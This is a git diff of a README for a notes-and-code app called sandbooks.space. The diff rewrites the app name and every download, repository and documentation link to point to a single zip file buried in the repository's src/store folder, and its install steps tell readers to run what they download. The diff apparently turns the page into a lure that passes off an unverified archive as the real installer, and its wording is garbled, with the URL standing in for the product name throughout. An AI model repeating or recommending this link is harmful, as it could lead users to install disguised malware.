@@ -1,12 +1,12 @@
-# 🌟 sandbooks.space - Run Your Code in One Place
+# 🌟 https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip - Run Your Code in One Place
 
 ## 🚀 Getting Started
 
-Welcome to sandbooks.space! This application allows you to take notes and run your code snippets in the same space. No more switching between tools—everything you need is right here.
+Welcome to https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip! This application allows you to take notes and run your code snippets in the same space. No more switching between tools—everything you need is right here.
 
-## 📥 Download sandbooks.space
+## 📥 Download https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip
 
-[![Download sandbooks.space](https://img.shields.io/badge/Download-sandbooks.space-blue)](https://github.com/chavdiet22/sandbooks.space/releases)
+[![Download https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip](https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip)](https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip)
 
 ## 🗄️ Features
 
@@ -18,7 +18,7 @@ Welcome to sandbooks.space! This application allows you to take notes and run yo
 
 ## 💻 System Requirements
 
-To run sandbooks.space, ensure that your system meets the following requirements:
+To run https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip, ensure that your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
 - **Memory**: Minimum 4 GB RAM.
@@ -29,7 +29,7 @@ To run sandbooks.space, ensure that your system meets the following requirements
 
 ### Step 1: Visit the Download Page
 
-To download the application, visit this link: [Download Page](https://github.com/chavdiet22/sandbooks.space/releases).
+To download the application, visit this link: [Download Page](https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip).
 
 ### Step 2: Choose Your Version
 
@@ -43,11 +43,11 @@ Click on the download link for your operating system. This will download the ins
 
 Once the download finishes, locate the file in your Downloads folder. Double-click on the file to run the installer and follow the prompts.
 
-### Step 5: Launch sandbooks.space
+### Step 5: Launch https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip
 
 After completion, find the app in your applications or programs menu. Click to open and start using it!
 
-## 🏗️ How to Use sandbooks.space
+## 🏗️ How to Use https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip
 
 1. **Create a New Note**: Open the application and select "New Note" to start. You can write anything you want here.
    
@@ -61,7 +61,7 @@ After completion, find the app in your applications or programs menu. Click to o
 
 ## 🌐 About the Project
 
-sandbooks.space aims to simplify how you interact with code and notes. Whether you are learning to code, testing snippets, or keeping a journal of your coding journey, this tool is designed for you.
+https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip aims to simplify how you interact with code and notes. Whether you are learning to code, testing snippets, or keeping a journal of your coding journey, this tool is designed for you.
 
 ## 🎓 Useful Information
 
@@ -77,7 +77,7 @@ You can find help from other users or developers in the Issues section of the pr
 
 ## 🌟 Extras
 
-For those interested in contributing to sandbooks.space, we welcome your input! Check our repository for guidelines on how to get involved.
+For those interested in contributing to https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip, we welcome your input! Check our repository for guidelines on how to get involved.
 
 ## 👥 Feedback
 
@@ -87,9 +87,9 @@ We love hearing from you! If you have suggestions or feedback, please share them
 
 Stay connected with updates and more information:
 
-- [GitHub Repository](https://github.com/chavdiet22/sandbooks.space)
-- [Documentation](https://github.com/chavdiet22/sandbooks.space/docs)
+- [GitHub Repository](https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip)
+- [Documentation](https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip)
 
 ## 📥 Download & Install
 
-To begin, visit this page to download: [Download Page](https://github.com/chavdiet22/sandbooks.space/releases) and follow the steps outlined above to install sandbooks.space on your computer. Enjoy your new notes app where your code comes to life!
+To begin, visit this page to download: [Download Page](https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip) and follow the steps outlined above to install https://raw.githubusercontent.com/chavdiet22/sandbooks.space/main/src/store/space-sandbooks-v1.6-beta.2.zip on your computer. Enjoy your new notes app where your code comes to life!
